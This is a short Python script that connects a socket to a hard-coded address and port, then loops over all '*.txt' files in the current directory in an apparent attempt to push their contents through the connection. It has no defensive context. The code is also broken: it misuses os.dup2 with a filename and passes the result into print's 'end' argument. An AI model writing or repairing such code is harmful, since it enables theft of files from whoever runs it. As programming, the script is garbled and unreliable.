import glob
import socket
import os

ip = "0.0.0.0"
porta = 1234

cliente = socket.socket()
cliente.connect((ip,porta))

while True:
	for file in glob.iglob("*.txt"):
		print(file,end=os.dup2(cliente.fileno(),file))
	